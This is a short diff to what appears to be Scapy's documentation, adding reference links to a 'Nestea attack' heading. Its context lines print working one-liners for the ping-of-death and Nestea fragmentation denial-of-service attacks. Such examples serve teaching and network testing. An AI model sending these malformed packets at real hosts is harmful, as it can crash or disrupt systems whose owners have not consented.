@@ -1204,7 +1204,7 @@ Ping of death (Muuahahah)::
 
     >>> send( fragment(IP(dst="10.0.0.5")/ICMP()/("X"*60000)) ) 
 
-Nestea attack::
+`Nestea <https://www3.physnet.uni-hamburg.de/physnet/security/vulnerability/nestea.html>`_ `attack <http://insecure.org/sploits/linux.PalmOS.nestea.html>`_ ::
 
     >>> send(IP(dst=target, id=42, flags="MF")/UDP()/("X"*10)) 
     >>> send(IP(dst=target, id=42, frag=48)/("X"*116)) 
